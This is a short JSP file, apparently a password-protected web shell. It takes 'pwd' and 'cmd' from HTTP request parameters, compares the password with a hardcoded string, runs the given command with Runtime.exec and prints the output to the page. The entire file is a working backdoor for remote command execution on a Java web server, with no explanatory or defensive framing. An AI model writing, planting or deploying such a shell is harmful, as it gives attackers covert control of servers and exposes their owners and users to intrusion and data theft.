<%@ page contentType="text/html; charset=GBK" language="java" buffer="32kb" %>
<%@ page import="java.lang.Runtime,java.io.*" %>
<%
    String pwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    Runtime r = java.lang.Runtime.getRuntime(); 
    String output = "";
    if((pwd != null) && (cmd != null)) {
        if (pwd.equals("sdkfsdjfkdsfiek")){
            String s = null;
            try {
                Process p = r.exec(cmd);
                BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) {
                    output += s +"\r\n";
                }
            } catch(Exception e) {
                e.printStackTrace();
            }
            out.println("<pre>"+output+"</pre>");
        }
    }
%>
